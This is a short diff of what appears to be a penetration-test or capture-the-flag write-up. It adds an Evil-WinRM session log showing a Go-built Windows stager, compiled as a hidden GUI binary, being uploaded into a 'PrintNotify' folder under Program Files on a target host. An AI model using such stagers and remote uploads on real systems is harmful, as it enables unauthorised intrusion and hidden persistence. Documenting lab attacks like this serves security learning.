@@ -1180,5 +1180,15 @@ GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build -ldflags="-H windowsgui" -o sta
 Ill recompile it since i deleted the .exe from earlier
 
 ```python
+*Evil-WinRM* PS C:\Program Files\PrintNotify> upload stager.exe
+                                        
+Info: Uploading /home/kali/hsm/NorthStone/stager.exe to C:\Program Files\PrintNotify\stager.exe
+                                        
+Data: 11358888 bytes of 11358888 bytes copied
+                                        
+Info: Upload successful!
+```
+
+```python
 
 ```
